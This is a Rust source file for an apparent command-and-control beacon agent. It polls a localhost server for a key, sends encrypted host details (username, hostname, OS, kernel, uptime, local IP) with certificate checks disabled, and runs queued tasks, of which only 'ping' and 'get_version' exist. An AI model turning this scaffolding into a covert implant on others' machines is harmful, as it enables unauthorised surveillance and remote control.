mod info;
use reqwest::{get, ClientBuilder};
use serde::{Deserialize, Serialize};
mod crypt;
use std::{net::IpAddr, string, time::Duration};
const SERVER: &str = "https://127.0.0.1:6060";
const GETKEY: &str = "/get_key";
const ADVERTISE: &str = "/advertise";
const ADDRESULT: &str = "/add_result";
const VERSION: &str = "0.1";

const Unhealthy_Timout: u64 = 60;
const CONNECT_Timout: u64 = 10;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AddTaskresult {
    pub(crate)  id: String,
    pub(crate)  taskid: String,
    pub(crate)  result: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Device {
    pub(crate) id: String,
    pub(crate) status: String,
    pub(crate) username: String,
    pub(crate) hostname: String,
    pub(crate) latency: String,
    pub(crate) os: String,
    pub(crate) os_version: String,
    pub(crate) kernal_version:String,
    pub(crate) uptime:String,
    pub(crate) local_ip: String,
}
async fn log(msg:&str) {
    println!("{}", msg)
}
async fn get_local_fingerprint() -> String{
    let osver = match sysinfo::System::os_version(){
        Some(ver) => ver,
        None => {"30 None".to_string()},
    };
    let hostname: String = match sysinfo::System::host_name() {
        Some(name) => name,
        None => {
            "35 None".to_string()   
        },
    };
    let kernal_version: String = match sysinfo::System::kernel_version() {
        Some(ver) => ver,
        None => {
            "41 None".to_string()
        },
    };

    let fingerprint: String = format!("{}:{}:{}:{}",osver,hostname,kernal_version,info::get_local_ip());
    // HASH FINGER PRINT
    let mut hasher = <sha1::Sha1 as sha1::Digest>::new();
    sha1::Digest::update(&mut hasher, fingerprint);
    let result = sha1::Digest::finalize(hasher);
    let hex = format!("{:x}", result);

    return hex;

}
async fn progress(url:String,command:String,taskid:String,key:String){
    
    match command.as_str() {
        "ping" => {
            let _ = add_result(url.to_string(), key, "pong".to_string(), taskid.to_string()).await;
        }
        "get_version" => {
            let _ = add_result(url.to_string(), key, VERSION.to_string(), taskid.to_string()).await;
        }
        _ =>  {
            let _ = add_result(url.to_string(), key, "not an command".to_string(), taskid.to_string()).await;
        }
    }

    

}




async fn advertise(url: String,key:String) -> bool{
    let info: Device = Device { id: get_local_fingerprint().await, status: "".to_string(), username: info::getusername(), hostname: info::gethostname(), os: info::getosname(), os_version: info::getosversion(),latency:info::getlatency(url.to_string()).await, kernal_version: info::getkernelversion(), uptime: info::getpcuptime(), local_ip: info::get_local_ip() };
    let info = match serde_json::to_string(&info){
        Ok(str) => str,
        Err(_) => {
            
            log("Error: During Parsing Advertising Data");
            return false;},
    };
    let info = crypt::encrypt_string(key.as_bytes(), &info);
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true) 
        .timeout(Duration::from_secs(30))
        .build();
    let client = match client {
        Ok(client) => client,
        Err(_) => {return false;},
    };
    
    let res = client
        .post(url.to_string() + ADVERTISE)
        .json(&info)
        .send()
        ;
    let res = match res.await{
        Ok(res) => res,
        Err(_) =>{return false;},
    };
    let tex = match res.text().await{
        Ok(tex) => tex,
        Err(ett) => {
            log("Error: Invalid Response by Server in Adverticeing process").await; 
            return false;
        }
    };
    if tex != "ok"{
        
        let respdecrypted = crypt::decrypt_string(key.as_bytes(), &tex);
        if respdecrypted == "base64_decode_error" || respdecrypted == "invalid_data" || respdecrypted == "decryption_error"{
            return false;
        }
        else {
            let parts: Vec<&str> = respdecrypted.split("__").collect();
            if parts.len() != 2{
                return false;
            }
            else {
                let taskid = parts[1].to_string();
                let command = parts[0].to_string();
                let key_clone = key.clone();
                let _ = add_result(url.to_string(), key.to_string(), "received".to_string(), taskid.to_string()).await;
                tokio::spawn(async move {
                    let _ = progress(url.to_string(), command.to_string(), taskid.to_string(), key_clone.to_string()).await; // offline handler
                });

            }
        }
        
        return true;
    }
    else {
        return true;
    }

    
}

async fn add_result(url:String,key:String,result:String,taskid:String) -> bool{
    
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true) 
        .timeout(Duration::from_secs(11))
        .build().expect("ERROR");

    let task: AddTaskresult = AddTaskresult { id: get_local_fingerprint().await.to_string(), taskid: taskid.to_string(), result: result.to_string()};
    let task = match serde_json::to_string(&task){
        Ok(str) => str,
        Err(_) => {
            
            log("Error: During Parsing Task Result Data").await;
            return false;},
    };
    let encryptedt = crypt::encrypt_string(key.as_bytes(),&task);
    let res = client
        .post(url.to_string() + ADDRESULT)
        .json(&encryptedt)
        .send().await;
    
    return true;
}

async fn get_key(url: String) -> String{
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true) 
        .timeout(Duration::from_secs(10))
        .build().expect("ERROR");
    let res = client
        .get(url.to_string() + GETKEY)
        .send()
        .await;
    let txt = match res{
        Ok(res) => match res.text().await{
            Ok(txt) => txt,
            Err(err) => {
               println!("ERR 26 {}",err);
               return "".to_string();
            },
        },
        Err(err) => {
            return "".to_string();
        },
    };
    return txt.to_string();
}


#[tokio::main]
async fn main() {

    println!("agent inilized");
    let mut server = SERVER.to_string();
    let mut getkey: String = "".to_string();

    loop {
        let key = get_key(server.to_string()).await;
        if key == ""{
            tokio::time::sleep(Duration::from_secs(Unhealthy_Timout)).await;
        }
        else {
            getkey = key;
            println!("{}",getkey);
            break;
        }

    }
    
    loop {
        
        let adv= advertise(server.to_string(), getkey.to_string()).await;
        if adv{
            tokio::time::sleep(Duration::from_secs(CONNECT_Timout)).await
        }
        else {
            
            tokio::time::sleep(Duration::from_secs(Unhealthy_Timout)).await
            
        }
    }
}
